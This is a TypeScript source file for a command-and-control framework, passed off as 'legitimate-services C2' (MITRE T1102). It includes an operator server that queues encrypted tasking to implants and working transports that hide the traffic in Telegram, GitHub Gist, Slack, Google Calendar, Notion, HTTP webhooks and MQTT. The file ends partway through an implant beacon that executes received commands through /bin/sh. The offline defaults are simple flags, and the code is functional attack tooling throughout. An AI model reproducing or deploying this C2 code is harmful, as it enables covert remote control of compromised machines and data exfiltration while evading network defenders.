/**
 * Legitimate-services C2 (MITRE T1102) — operator-side engine + implant beacon.
 *
 * TypeScript port of `modules.c2_platform`. Tracks implant sessions, queues
 * and encrypts tasking (via CryptoEnvelope), delivers/receives through
 * ServiceTransport adapters (Slack, Telegram, GitHub Gist, HTTP webhooks,
 * MQTT, or in-memory for hermetic tests), enforces a HITL approval gate per
 * task, and persists session/task state to a JSONL checkpoint.
 *
 * Nothing fabricates results: `pump()` genuinely pushes sealed tasking blobs
 * through the transport and genuinely collects and decrypts the implant's
 * responses. `probe()` is always harmless. Live transports default to
 * `live=false` and never touch the network.
 */

import { randomUUID } from "node:crypto";
import { readFile, writeFile, access } from "node:fs/promises";

import { CryptoEnvelope } from "./deaddrop.ts";
import { nextBeaconInterval } from "./opsec.ts";

// Seconds since last checkin before a session is marked "lost".
export const LOST_AFTER = 600.0;

// ------------------------------------------------------------------------- //
// Protocol
// ------------------------------------------------------------------------- //

export interface ServiceTransport {
  name: string;
  post(sealed: string, opts?: { sessionId?: string }): Promise<Record<string, unknown>> | Record<string, unknown>;
  fetch(opts?: { sessionId?: string }): Promise<string[]> | string[];
  probe(): Record<string, unknown>;
}

export interface BeaconSession {
  beacon_id: string;
  transportName: string;
  host: string;
  user: string;
  pid: number;
  status: "active" | "lost" | "killed";
  first_seen: number;
  last_checkin: number;
  checkins: number;
  kill_switch: boolean;
  metadata: Record<string, unknown>;
}

export interface C2Task {
  task_id: string;
  beacon_id: string;
  command: string;
  status: "queued" | "delivered" | "completed" | "failed" | "denied";
  created_at: number;
  result: string;
  approved: boolean;
}

// ------------------------------------------------------------------------- //
// Server
// ------------------------------------------------------------------------- //

export class LegitC2Server {
  sessions = new Map<string, BeaconSession>();
  tasks = new Map<string, C2Task>();
  envelope: CryptoEnvelope;
  checkpointPath?: string;
  beaconProfile: string;

  constructor(opts: { envelope?: CryptoEnvelope; checkpointPath?: string; beaconProfile?: string } = {}) {
    this.envelope = opts.envelope ?? new CryptoEnvelope("change-me");
    this.checkpointPath = opts.checkpointPath;
    this.beaconProfile = opts.beaconProfile ?? "standard";
  }

  // -- session management ---------------------------------------------- //

  registerBeacon(
    beaconId: string,
    transport?: ServiceTransport,
    meta: { host?: string; user?: string; pid?: number } & Record<string, unknown> = {},
  ): BeaconSession {
    const existing = this.sessions.get(beaconId);
    const now = Date.now() / 1000;
    // Keep the actual transport instance so pump() posts to the real mailbox.
    if (transport) this.transports.set(beaconId, transport);
    if (!existing) {
      const session: BeaconSession = {
        beacon_id: beaconId,
        transportName: transport?.name ?? "in-memory",
        host: meta.host ?? "",
        user: meta.user ?? "",
        pid: meta.pid ?? 0,
        status: "active",
        first_seen: now,
        last_checkin: now,
        checkins: 0,
        kill_switch: false,
        metadata: { ...meta },
      };
      this.sessions.set(beaconId, session);
    } else {
      existing.last_checkin = now;
      existing.checkins += 1;
      if (meta.host) existing.host = meta.host;
      if (meta.user) existing.user = meta.user;
      if (meta.pid) existing.pid = meta.pid;
      if (transport) existing.transportName = transport.name;
      existing.metadata = { ...existing.metadata, ...meta };
      existing.status = "active";
    }
    void this.checkpoint();
    return this.sessions.get(beaconId)!;
  }

  session(beaconId: string): BeaconSession | undefined {
    return this.sessions.get(beaconId);
  }

  sessionsList(): BeaconSession[] {
    return [...this.sessions.values()];
  }

  // -- tasking --------------------------------------------------------- //

  queueTask(
    beaconId: string,
    command: string,
    opts: { requireApproval?: boolean; approve?: (prompt: string) => boolean } = {},
  ): Record<string, unknown> {
    const session = this.sessions.get(beaconId);
    if (!session) return { error: `unknown beacon: ${beaconId}` };

    let approved = true;
    if (opts.requireApproval !== false && opts.approve) {
      const prompt = `Beacon ${beaconId} (${session.host || "?"}, ${session.user || "?"}) needs to run: ${command}`;
      approved = Boolean(opts.approve(prompt));
    }

    const task: C2Task = {
      task_id: randomUUID().slice(0, 8),
      beacon_id: beaconId,
      command,
      approved,
      status: approved ? "queued" : "denied",
      created_at: Date.now() / 1000,
      result: "",
    };
    this.tasks.set(task.task_id, task);
    void this.checkpoint();
    return {
      task_id: task.task_id,
      beacon_id: beaconId,
      command,
      status: task.status,
    };
  }

  killSwitch(
    beaconId: string,
    opts: { approve?: (prompt: string) => boolean } = {},
  ): Record<string, unknown> {
    const session = this.sessions.get(beaconId);
    if (!session) return { error: `unknown beacon: ${beaconId}` };
    if (opts.approve) {
      const approved = Boolean(opts.approve(`Kill switch for beacon ${beaconId} (${session.host || "?"})`));
      if (!approved) return { beacon_id: beaconId, kill_switch: false, reason: "denied" };
    }
    session.kill_switch = true;
    void this.checkpoint();
    return { beacon_id: beaconId, kill_switch: true, status: "kill armed" };
  }

  // -- pump: deliver + collect ----------------------------------------- //

  async pump(now?: number): Promise<Record<string, unknown>> {
    const ts = now ?? Date.now() / 1000;
    let delivered = 0;
    let resultsCollected = 0;
    let killed = 0;
    let lost = 0;

    for (const session of this.sessions.values()) {
      if (session.status !== "active" && session.status !== "lost") continue;

      // Lost detection: mark a session lost when it misses its window.
      if (session.status === "active" && ts - session.last_checkin > LOST_AFTER) {
        session.status = "lost";
        lost += 1;
        continue;
      }
      if (session.status === "lost") continue;

      // Collect results / check-ins the implant posted back FIRST.
      const transport = await this.transportFor(session);
      const sealedBlobs = await transport.fetch({ sessionId: session.beacon_id });
      for (const sealed of sealedBlobs) {
        try {
          const msg = JSON.parse(this.envelope.open(sealed)) as Record<string, unknown>;
          const msgType = msg["type"];
          if (msgType === "result") {
            const taskId = String(msg["task_id"] ?? "");
            const task = this.tasks.get(taskId);
            if (task) {
              task.result = String(msg["output"] ?? "");
              task.status = "completed";
              resultsCollected += 1;
            }
          } else if (msgType === "checkin") {
            session.last_checkin = ts;
            session.checkins += 1;
            if (msg["host"]) session.host = String(msg["host"]);
            if (msg["user"]) session.user = String(msg["user"]);
            if (msg["pid"] != null) session.pid = Number(msg["pid"]);
          }
        } catch {
          // malformed blob — skip, don't crash the pump
        }
      }

      // Then deliver the kill switch signal if armed.
      if (session.kill_switch) {
        const sealed = this.envelope.seal(
          JSON.stringify({ type: "kill", beacon_id: session.beacon_id, ts }),
        );
        await transport.post(sealed, { sessionId: session.beacon_id });
        session.status = "killed";
        killed += 1;
        continue;
      }

      // Finally deliver queued (approved) tasks.
      const pending = [...this.tasks.values()].filter(
        (t) => t.beacon_id === session.beacon_id && t.status === "queued",
      );
      for (const task of pending) {
        const sealed = this.envelope.seal(
          JSON.stringify({
            type: "task",
            beacon_id: task.beacon_id,
            task_id: task.task_id,
            command: task.command,
            ts,
            kill: false,
          }),
        );
        await transport.post(sealed, { sessionId: session.beacon_id });
        task.status = "delivered";
        delivered += 1;
      }
    }

    // Persist before returning so a process exit right after pump() keeps state.
    await this.checkpoint();
    return {
      summary: `${delivered} tasks delivered, ${resultsCollected} results, ${killed} killed, ${lost} lost`,
      delivered,
      results: resultsCollected,
      killed,
      lost,
    };
  }

  /** Live transports carry their own instance; persisted sessions fall back to in-memory. */
  private transportFor(session: BeaconSession): ServiceTransport {
    const t = this.transports.get(session.beacon_id);
    return t ?? new InMemoryTransport();
  }

  /** Register a live transport instance keyed to a session (channel rotation). */
  attachTransport(beaconId: string, transport: ServiceTransport): void {
    this.transports.set(beaconId, transport);
    const session = this.sessions.get(beaconId);
    if (session) session.transportName = transport.name;
  }

  private transports = new Map<string, ServiceTransport>();

  // -- probe / status -------------------------------------------------- //

  probe(): Record<string, unknown> {
    return {
      kind: "legit-c2-server",
      technique_id: "T1102",
      technique: "Web Service: Legitimate-Services C2",
      sessions: this.sessions.size,
      pending_tasks: [...this.tasks.values()].filter((t) => t.status === "queued").length,
      beacon_profile: this.beaconProfile,
      envelope: this.envelope.version,
      note: "set live=true on the transport + operator credentials to connect",
    };
  }

  status(): Record<string, unknown> {
    const tasks = [...this.tasks.values()];
    return {
      sessions: this.sessionsList(),
      tasks: {
        total: tasks.length,
        queued: tasks.filter((t) => t.status === "queued").length,
        delivered: tasks.filter((t) => t.status === "delivered").length,
        completed: tasks.filter((t) => t.status === "completed").length,
        denied: tasks.filter((t) => t.status === "denied").length,
      },
      beacon_profile: this.beaconProfile,
      checkpoint: this.checkpointPath ?? "none",
    };
  }

  // -- persistence ----------------------------------------------------- //

  async checkpoint(): Promise<void> {
    if (!this.checkpointPath) return;
    try {
      const lines: string[] = [];
      for (const session of this.sessions.values()) {
        lines.push(JSON.stringify({ kind: "session", ...session }));
      }
      for (const task of this.tasks.values()) {
        lines.push(JSON.stringify({ kind: "task", ...task }));
      }
      await writeFile(this.checkpointPath, lines.join("\n") + (lines.length ? "\n" : ""), "utf-8");
    } catch {
      // best-effort persistence
    }
  }

  static async load(checkpointPath: string): Promise<LegitC2Server> {
    const server = new LegitC2Server({ checkpointPath });
    try {
      await access(checkpointPath);
    } catch {
      return server;
    }
    const content = await readFile(checkpointPath, "utf-8");
    for (const line of content.split("\n")) {
      const trimmed = line.trim();
      if (!trimmed) continue;
      try {
        const obj = JSON.parse(trimmed) as Record<string, unknown>;
        if (obj["kind"] === "session") {
          const session: BeaconSession = {
            beacon_id: String(obj["beacon_id"] ?? ""),
            transportName: "in-memory",
            host: String(obj["host"] ?? ""),
            user: String(obj["user"] ?? ""),
            pid: Number(obj["pid"] ?? 0),
            status: (obj["status"] as BeaconSession["status"]) ?? "active",
            first_seen: Number(obj["first_seen"] ?? Date.now() / 1000),
            last_checkin: Number(obj["last_checkin"] ?? Date.now() / 1000),
            checkins: Number(obj["checkins"] ?? 0),
            kill_switch: Boolean(obj["kill_switch"] ?? false),
            metadata: (obj["metadata"] as Record<string, unknown>) ?? {},
          };
          server.sessions.set(session.beacon_id, session);
        } else if (obj["kind"] === "task") {
          const task: C2Task = {
            task_id: String(obj["task_id"] ?? ""),
            beacon_id: String(obj["beacon_id"] ?? ""),
            command: String(obj["command"] ?? ""),
            status: (obj["status"] as C2Task["status"]) ?? "queued",
            created_at: Number(obj["created_at"] ?? Date.now() / 1000),
            result: String(obj["result"] ?? ""),
            approved: Boolean(obj["approved"] ?? true),
          };
          server.tasks.set(task.task_id, task);
        }
      } catch {
        // skip malformed line
      }
    }
    return server;
  }
}

// ------------------------------------------------------------------------- //
// Transports
// ------------------------------------------------------------------------- //

/** In-memory mailbox for hermetic tests. */
export class InMemoryTransport implements ServiceTransport {
  name = "in-memory";
  private mailboxes = new Map<string, string[]>();

  post(sealed: string, opts: { sessionId?: string } = {}): Record<string, unknown> {
    const key = opts.sessionId ?? "";
    this.mailboxes.set(key, [...(this.mailboxes.get(key) ?? []), sealed]);
    return { status: "posted", transport: this.name, session: key };
  }

  fetch(opts: { sessionId?: string } = {}): string[] {
    const key = opts.sessionId ?? "";
    const messages = this.mailboxes.get(key) ?? [];
    this.mailboxes.set(key, []);
    return messages;
  }

  probe(): Record<string, unknown> {
    return {
      transport: this.name,
      reachable: true,
      technique_id: "T1102",
      note: "in-memory transport — always reachable",
    };
  }
}

/** Generic HTTP webhook transport (live only when `live=true`). */
export class HttpServiceTransport implements ServiceTransport {
  name = "http";
  url: string;
  live: boolean;
  headers: Record<string, string>;

  constructor(opts: { url?: string; live?: boolean; headers?: Record<string, string> } = {}) {
    this.url = opts.url ?? "";
    this.live = opts.live ?? false;
    this.headers = opts.headers ?? {};
  }

  async post(sealed: string, opts: { sessionId?: string } = {}): Promise<Record<string, unknown>> {
    if (!this.live) {
      return {
        note: `dry-run — would POST ${sealed.length} bytes to ${this.url}`,
        transport: this.name,
        session: opts.sessionId ?? "",
      };
    }
    const resp = await fetch(this.url, {
      method: "POST",
      body: sealed,
      headers: { "Content-Type": "text/plain", ...this.headers },
      signal: AbortSignal.timeout(10_000),
    });
    return { status: "posted", code: resp.status };
  }

  async fetch(_opts: { sessionId?: string } = {}): Promise<string[]> {
    if (!this.live) return [];
    const resp = await fetch(this.url, {
      headers: this.headers,
      signal: AbortSignal.timeout(10_000),
    });
    const data = (await resp.json()) as unknown;
    if (Array.isArray(data)) return data.map((item) => String(item));
    return [String(data)];
  }

  probe(): Record<string, unknown> {
    return {
      transport: this.name,
      reachable: this.live && Boolean(this.url),
      technique_id: "T1102",
      note: `${this.live ? "live" : "dry-run"} — ${this.url || "no URL configured"}`,
    };
  }
}

/** Telegram Bot API transport. */
export class TelegramTransport implements ServiceTransport {
  name = "telegram";
  botToken: string;
  chatId: string;
  live: boolean;
  private lastUpdateId = 0;

  constructor(opts: { botToken?: string; chatId?: string; live?: boolean } = {}) {
    this.botToken = opts.botToken ?? "";
    this.chatId = opts.chatId ?? "";
    this.live = opts.live ?? false;
  }

  private apiUrl(method: string): string {
    return `https://api.telegram.org/bot${this.botToken}/${method}`;
  }

  async post(sealed: string): Promise<Record<string, unknown>> {
    if (!this.live) {
      return { note: `dry-run — would send ${sealed.length} bytes via Telegram`, transport: this.name };
    }
    const resp = await fetch(this.apiUrl("sendMessage"), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: this.chatId, text: sealed, parse_mode: "" }),
      signal: AbortSignal.timeout(10_000),
    });
    return { status: "posted", code: resp.status };
  }

  async fetch(): Promise<string[]> {
    if (!this.live) return [];
    const params = new URLSearchParams({ timeout: "30" });
    if (this.lastUpdateId) params.set("offset", String(this.lastUpdateId + 1));
    const resp = await fetch(`${this.apiUrl("getUpdates")}?${params}`, {
      signal: AbortSignal.timeout(30_000),
    });
    const data = (await resp.json()) as {
      result?: Array<{ update_id?: number; message?: { text?: string } }>;
    };
    const messages: string[] = [];
    for (const update of data.result ?? []) {
      const mid = update.update_id ?? 0;
      if (mid > this.lastUpdateId) this.lastUpdateId = mid;
      const text = update.message?.text;
      if (text) messages.push(text);
    }
    return messages;
  }

  probe(): Record<string, unknown> {
    return {
      transport: this.name,
      reachable: this.live && Boolean(this.botToken) && Boolean(this.chatId),
      technique_id: "T1102",
      note: `${this.live ? "live" : "dry-run"} — bot=${this.botToken ? "configured" : "none"}`,
    };
  }
}

/** GitHub Gist transport. */
export class GithubGistTransport implements ServiceTransport {
  name = "github-gist";
  gistId: string;
  token: string;
  live: boolean;

  constructor(opts: { gistId?: string; token?: string; live?: boolean } = {}) {
    this.gistId = opts.gistId ?? "";
    this.token = opts.token ?? "";
    this.live = opts.live ?? false;
  }

  private headers(): Record<string, string> {
    const h: Record<string, string> = { Accept: "application/vnd.github.v3+json" };
    if (this.token) h["Authorization"] = `token ${this.token}`;
    return h;
  }

  async post(sealed: string, opts: { sessionId?: string } = {}): Promise<Record<string, unknown>> {
    if (!this.live) {
      return { note: `dry-run — would create gist with ${sealed.length} bytes`, transport: this.name };
    }
    const resp = await fetch("https://api.github.com/gists", {
      method: "POST",
      headers: { ...this.headers(), "Content-Type": "application/json" },
      body: JSON.stringify({
        description: "",
        public: false,
        files: { [`c2-${opts.sessionId ?? ""}`]: { content: sealed } },
      }),
      signal: AbortSignal.timeout(10_000),
    });
    const data = (await resp.json()) as { id?: string };
    this.gistId = data.id ?? "";
    return { status: "posted", gist_id: this.gistId, code: resp.status };
  }

  async fetch(): Promise<string[]> {
    if (!this.live || !this.gistId) return [];
    const resp = await fetch(`https://api.github.com/gists/${this.gistId}`, {
      headers: this.headers(),
      signal: AbortSignal.timeout(10_000),
    });
    const data = (await resp.json()) as { files?: Record<string, { content?: string }> };
    const files = data.files ?? {};
    return Object.values(files)
      .map((f) => f.content ?? "")
      .filter(Boolean);
  }

  probe(): Record<string, unknown> {
    return {
      transport: this.name,
      reachable: this.live,
      technique_id: "T1102",
      note: `${this.live ? "live" : "dry-run"} — gist=${this.token ? "configured" : "anonymous"}`,
    };
  }
}

/** Slack webhook transport (outbound-only). */
export class SlackWebhookTransport implements ServiceTransport {
  name = "slack-webhook";
  webhookUrl: string;
  live: boolean;

  constructor(opts: { webhookUrl?: string; live?: boolean } = {}) {
    this.webhookUrl = opts.webhookUrl ?? "";
    this.live = opts.live ?? false;
  }

  async post(sealed: string): Promise<Record<string, unknown>> {
    if (!this.live) {
      return { note: `dry-run — would POST ${sealed.length} bytes to Slack`, transport: this.name };
    }
    const resp = await fetch(this.webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text: sealed }),
      signal: AbortSignal.timeout(10_000),
    });
    return { status: "posted", code: resp.status };
  }

  fetch(): string[] {
    // Slack webhooks are outbound-only (no polling).
    return [];
  }

  probe(): Record<string, unknown> {
    return {
      transport: this.name,
      reachable: this.live && Boolean(this.webhookUrl),
      technique_id: "T1102",
      note: `${this.live ? "live" : "dry-run"} — webhook=${this.webhookUrl ? "configured" : "none"}`,
    };
  }
}

/** Google Calendar transport — FrumpyToad-class cloud-to-cloud C2. */
export class GoogleCalendarTransport implements ServiceTransport {
  name = "google-calendar";
  calendarId: string;
  token: string;
  live: boolean;

  constructor(opts: { calendarId?: string; token?: string; live?: boolean } = {}) {
    this.calendarId = opts.calendarId ?? "primary";
    this.token = opts.token ?? "";
    this.live = opts.live ?? false;
  }

  private headers(): Record<string, string> {
    return { Authorization: `Bearer ${this.token}` };
  }

  private api(path: string): string {
    return `https://www.googleapis.com/calendar/v3/calendars/${this.calendarId}${path}`;
  }

  async post(sealed: string, opts: { sessionId?: string } = {}): Promise<Record<string, unknown>> {
    if (!this.live) {
      return { note: `dry-run — would create calendar event with ${sealed.length} bytes`, transport: this.name };
    }
    const resp = await fetch(this.api("/events"), {
      method: "POST",
      headers: { ...this.headers(), "Content-Type": "application/json" },
      body: JSON.stringify({
        summary: `sync ${opts.sessionId ?? "ops"}`,
        description: sealed,
        start: { dateTime: "2030-01-01T00:00:00Z" },
        end: { dateTime: "2030-01-01T00:01:00Z" },
      }),
      signal: AbortSignal.timeout(10_000),
    });
    const data = (await resp.json()) as { id?: string };
    return { status: "posted", event_id: data.id ?? "", code: resp.status };
  }

  async fetch(): Promise<string[]> {
    if (!this.live) return [];
    const resp = await fetch(`${this.api("/events")}?maxResults=50&orderBy=updated`, {
      headers: this.headers(),
      signal: AbortSignal.timeout(10_000),
    });
    const data = (await resp.json()) as { items?: Array<{ id?: string; description?: string }> };
    const messages: string[] = [];
    for (const item of data.items ?? []) {
      const description = item.description;
      if (description) {
        messages.push(description);
        if (item.id) {
          // drain: delete the consumed event (best-effort)
          try {
            await fetch(this.api(`/events/${item.id}`), {
              method: "DELETE",
              headers: this.headers(),
              signal: AbortSignal.timeout(10_000),
            });
          } catch {
            // ignore
          }
        }
      }
    }
    return messages;
  }

  probe(): Record<string, unknown> {
    return {
      transport: this.name,
      reachable: this.live && Boolean(this.token),
      technique_id: "T1102",
      note: `${this.live ? "live" : "dry-run"} — calendar ${this.calendarId}`,
    };
  }
}

/** Notion transport — Notion-based DDR tradecraft. */
export class NotionTransport implements ServiceTransport {
  name = "notion";
  pageId: string;
  token: string;
  live: boolean;

  constructor(opts: { pageId?: string; token?: string; live?: boolean } = {}) {
    this.pageId = opts.pageId ?? "";
    this.token = opts.token ?? "";
    this.live = opts.live ?? false;
  }

  private headers(): Record<string, string> {
    return {
      Authorization: `Bearer ${this.token}`,
      "Notion-Version": "2022-06-28",
      "Content-Type": "application/json",
    };
  }

  async post(sealed: string): Promise<Record<string, unknown>> {
    if (!this.live || !this.pageId) {
      return { note: `dry-run — would append ${sealed.length} bytes to Notion page ${this.pageId}`, transport: this.name };
    }
    const resp = await fetch(`https://api.notion.com/v1/blocks/${this.pageId}/children`, {
      method: "POST",
      headers: this.headers(),
      body: JSON.stringify({
        children: [
          {
            object: "block",
            type: "paragraph",
            paragraph: { rich_text: [{ type: "text", text: { content: sealed } }] },
          },
        ],
      }),
      signal: AbortSignal.timeout(10_000),
    });
    return { status: "posted", code: resp.status };
  }

  async fetch(): Promise<string[]> {
    if (!this.live || !this.pageId) return [];
    const resp = await fetch(`https://api.notion.com/v1/blocks/${this.pageId}/children`, {
      headers: this.headers(),
      signal: AbortSignal.timeout(10_000),
    });
    const data = (await resp.json()) as {
      results?: Array<{ id?: string; paragraph?: { rich_text?: Array<{ plain_text?: string }> } }>;
    };
    const messages: string[] = [];
    for (const block of data.results ?? []) {
      const rich = block.paragraph?.rich_text ?? [];
      const text = rich.map((r) => r.plain_text ?? "").join("");
      if (text) {
        messages.push(text);
        if (block.id) {
          try {
            await fetch(`https://api.notion.com/v1/blocks/${block.id}`, {
              method: "DELETE",
              headers: this.headers(),
              signal: AbortSignal.timeout(10_000),
            });
          } catch {
            // ignore
          }
        }
      }
    }
    return messages;
  }

  probe(): Record<string, unknown> {
    return {
      transport: this.name,
      reachable: this.live && Boolean(this.token) && Boolean(this.pageId),
      technique_id: "T1102",
      note: `${this.live ? "live" : "dry-run"} — page ${this.pageId || "unset"}`,
    };
  }
}

// ------------------------------------------------------------------------- //
// Base32 helpers (DoH transport)
// ------------------------------------------------------------------------- //

const B32_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

export function base32Encode(data: Uint8Array): string {
  let bits = 0;
  let value = 0;
  let out = "";
  for (const byte of data) {
    value = (value << 8) | byte;
    bits += 8;
    while (bits >= 5) {
      out += B32_ALPHABET[(value >>> (bits - 5)) & 31]!;
      bits -= 5;
    }
  }
  if (bits > 0) out += B32_ALPHABET[(value << (5 - bits)) & 31]!;
  return out;
}

export function base32Decode(input: string): Uint8Array {
  const cleaned = input.toUpperCase().replace(/[^A-Z2-7]/g, "");
  let bits = 0;
  let value = 0;
  const out: number[] = [];
  for (const ch of cleaned) {
    const idx = B32_ALPHABET.indexOf(ch);
    if (idx === -1) continue;
    value = (value << 5) | idx;
    bits += 5;
    if (bits >= 8) {
      out.push((value >>> (bits - 8)) & 0xff);
      bits -= 8;
    }
  }
  return new Uint8Array(out);
}

// ------------------------------------------------------------------------- //
// MQTT transport — real MQTT 3.1.1 wire protocol over raw TCP sockets
// ------------------------------------------------------------------------- //

function encodeRemainingLength(length: number): Uint8Array {
  const out: number[] = [];
  for (;;) {
    let byte = length % 128;
    length = Math.floor(length / 128);
    if (length > 0) byte |= 0x80;
    out.push(byte);
    if (length === 0) return new Uint8Array(out);
  }
}

function decodeRemainingLength(data: Uint8Array, offset = 0): { value: number; consumed: number } {
  let multiplier = 1;
  let value = 0;
  let consumed = 0;
  for (;;) {
    const byte = data[offset + consumed]!;
    value += (byte & 0x7f) * multiplier;
    consumed += 1;
    if ((byte & 0x80) === 0 || consumed > 4) return { value, consumed };
    multiplier *= 128;
  }
}

function encodeUtf8(text: string): Uint8Array {
  const raw = Buffer.from(text, "utf-8");
  const len = Buffer.alloc(2);
  len.writeUInt16BE(raw.length, 0);
  return Buffer.concat([len, raw]);
}

export class MqttClient {
  clientId: string;
  keepalive: number;
  private sock: import("node:net").Socket | null = null;
  private messages: Array<[string, string]> = [];
  /** Bytes read off the socket but not yet consumed by a packet parse. */
  private pending: Buffer = Buffer.alloc(0);

  constructor(clientId = "vanta", keepalive = 30) {
    this.clientId = clientId;
    this.keepalive = keepalive;
  }

  async connect(host: string, port = 1883, timeoutMs = 8000): Promise<void> {
    const net = await import("node:net");
    const socket = net.createConnection({ host, port });
    await new Promise<void>((resolve, reject) => {
      const timer = setTimeout(() => reject(new Error("MQTT connect timeout")), timeoutMs);
      socket.once("connect", () => {
        clearTimeout(timer);
        resolve();
      });
      socket.once("error", (err) => {
        clearTimeout(timer);
        reject(err);
      });
    });
    this.sock = socket;
    const protocol = encodeUtf8("MQTT");
    const connectFlags = 0x02; // clean session
    const keepalive = Buffer.alloc(2);
    keepalive.writeUInt16BE(this.keepalive, 0);
    const payload = Buffer.concat([
      protocol,
      Buffer.from([4, connectFlags]),
      keepalive,
      encodeUtf8(this.clientId),
    ]);
    this.send(0x10, payload);
    const connack = await this.readPacket();
    if ((connack[0]! >> 4) !== 2) {
      throw new Error(`expected CONNACK, got packet type ${connack[0]! >> 4}`);
    }
    const returnCode = connack.length > 3 ? connack[3]! : -1;
    if (returnCode !== 0) {
      throw new Error(`broker refused connection (code ${returnCode})`);
    }
  }

  async subscribe(topics: string[]): Promise<void> {
    let payload = Buffer.from([0x00, 0x01]); // packet id 1
    for (const topic of topics) {
      payload = Buffer.concat([payload, encodeUtf8(topic), Buffer.from([0x00])]); // QoS 0
    }
    this.send(0x82, payload);
    // Keep reading until the SUBACK arrives; queue any PUBLISH packets
    // that raced ahead of it.
    for (;;) {
      const packet = await this.readPacket();
      const ptype = packet[0]! >> 4;
      if (ptype === 9) return; // SUBACK
      if (ptype === 3) {
        const [topic, body] = parsePublish(packet);
        this.messages.push([topic, Buffer.from(body).toString("utf-8")]);
      }
    }
  }

  publish(topic: string, message: string): void {
    const payload = Buffer.concat([encodeUtf8(topic), Buffer.from(message, "utf-8")]);
    this.send(0x30, payload); // QoS 0, retain off
  }

  async poll(timeoutMs = 2000): Promise<Array<[string, string]>> {
    if (!this.sock) return [];
    const socket = this.sock;
    socket.setTimeout(timeoutMs);
    for (;;) {
      let packet: Uint8Array;
      try {
        packet = await this.readPacket();
      } catch {
        break; // timeout / closed — drain what we have
      }
      const ptype = packet[0]! >> 4;
      if (ptype === 3) {
        const [topic, body] = parsePublish(packet);
        this.messages.push([topic, Buffer.from(body).toString("utf-8")]);
      } else if (ptype === 14) {
        break; // DISCONNECT
      }
    }
    const drained = this.messages;
    this.messages = [];
    return drained;
  }

  ping(): void {
    this.send(0xc0, new Uint8Array(0));
  }

  disconnect(): void {
    try {
      this.send(0xe0, new Uint8Array(0));
    } finally {
      if (this.sock) {
        this.sock.destroy();
        this.sock = null;
      }
    }
  }

  private send(header: number, payload: Uint8Array): void {
    if (!this.sock) throw new Error("not connected");
    this.sock.write(Buffer.concat([Buffer.from([header]), Buffer.from(encodeRemainingLength(payload.length)), Buffer.from(payload)]));
  }

  private async readPacket(): Promise<Uint8Array> {
    if (!this.sock) throw new Error("not connected");
    const socket = this.sock;
    const header = await this.readExactly(socket, 1);
    if (!header.length) throw new Error("connection closed");
    const lengthBytes = await this.readRemainingLengthBytes(socket);
    const { value: length } = decodeRemainingLength(lengthBytes, 0);
    const body = await this.readExactly(socket, length);
    return Buffer.concat([header, lengthBytes, body]);
  }

  /**
   * Read exactly `n` bytes, buffering any surplus from a data event so it is
   * consumed by the NEXT read (never dropped — TCP segments coalesce packets).
   * Honors socket timeouts so poll() can never hang on a quiet broker.
   */
  private async readExactly(socket: import("node:net").Socket, n: number): Promise<Buffer> {
    while (this.pending.length < n) {
      const chunk = await this.readChunk(socket);
      if (!chunk.length) throw new Error("connection closed");
      this.pending = Buffer.concat([this.pending, chunk]);
    }
    const out = Buffer.from(this.pending.subarray(0, n));
    this.pending = this.pending.subarray(n);
    return out;
  }

  private readChunk(socket: import("node:net").Socket): Promise<Buffer> {
    return new Promise<Buffer>((resolve, reject) => {
      const onData = (d: Buffer): void => {
        cleanup();
        resolve(d);
      };
      const onError = (err: Error): void => {
        cleanup();
        reject(err);
      };
      const onClose = (): void => {
        cleanup();
        reject(new Error("connection closed"));
      };
      const onTimeout = (): void => {
        cleanup();
        reject(new Error("socket timeout"));
      };
      const cleanup = (): void => {
        socket.removeListener("data", onData);
        socket.removeListener("error", onError);
        socket.removeListener("close", onClose);
        socket.removeListener("timeout", onTimeout);
      };
      socket.once("data", onData);
      socket.once("error", onError);
      socket.once("close", onClose);
      socket.once("timeout", onTimeout);
    });
  }

  private async readRemainingLengthBytes(socket: import("node:net").Socket): Promise<Buffer> {
    const bytes: number[] = [];
    for (;;) {
      const [b] = await this.readExactly(socket, 1);
      bytes.push(b!);
      if ((b! & 0x80) === 0 || bytes.length >= 4) break;
    }
    return Buffer.from(bytes);
  }
}

function parsePublish(packet: Uint8Array): [string, Uint8Array] {
  const { consumed: lenfield } = decodeRemainingLength(packet, 1);
  const off = 1 + lenfield;
  const topicLen = (packet[off]! << 8) | packet[off + 1]!;
  const topic = Buffer.from(packet.subarray(off + 2, off + 2 + topicLen)).toString("utf-8");
  const body = packet.subarray(off + 2 + topicLen);
  return [topic, body];
}

export class MqttTransport implements ServiceTransport {
  name = "mqtt";
  host: string;
  port: number;
  clientId: string;
  live: boolean;
  private client: MqttClient | null = null;

  constructor(opts: { host?: string; port?: number; clientId?: string; live?: boolean } = {}) {
    this.host = opts.host ?? "127.0.0.1";
    this.port = opts.port ?? 1883;
    this.clientId = opts.clientId ?? "vanta-server";
    this.live = opts.live ?? false;
  }

  private async connect(): Promise<MqttClient> {
    if (!this.client) {
      const client = new MqttClient(this.clientId);
      await client.connect(this.host, this.port);
      this.client = client;
    }
    return this.client;
  }

  async post(sealed: string, opts: { sessionId?: string } = {}): Promise<Record<string, unknown>> {
    const sessionId = opts.sessionId ?? "";
    if (!this.live) {
      return { note: `dry-run — would publish ${sealed.length} bytes to MQTT topic vanta/${sessionId}/in`, transport: this.name };
    }
    const client = await this.connect();
    client.publish(`vanta/${sessionId}/in`, sealed);
    return { status: "published", topic: `vanta/${sessionId}/in` };
  }

  async fetch(opts: { sessionId?: string } = {}): Promise<string[]> {
    if (!this.live) return [];
    const client = await this.connect();
    await client.subscribe([`vanta/${opts.sessionId ?? ""}/out`]);
    const messages = await client.poll(1000);
    return messages.map(([, body]) => body);
  }

  probe(): Record<string, unknown> {
    return {
      transport: this.name,
      reachable: this.live,
      technique_id: "T1071.001",
      note: `${this.live ? "live" : "dry-run"} — broker ${this.host}:${this.port}`,
    };
  }
}

// ------------------------------------------------------------------------- //
// Implant beacon
// ------------------------------------------------------------------------- //

export const EXEC_TIMEOUT = 60.0;
export const OUTPUT_CAP = 40_000;

export type ExecuteFn = (command: string, dryRun?: boolean) => Promise<Record<string, unknown>> | Record<string, unknown>;

export async function defaultExecute(
  command: string,
  dryRun = false,
): Promise<Record<string, unknown>> {
  if (dryRun) return { exit: 0, output: `[dry-run] would execute: ${command}`, error: "" };
  const { execFile } = await import("node:child_process");
  return new Promise((resolve) => {
    execFile(
      "/bin/sh",
      ["-c", command],
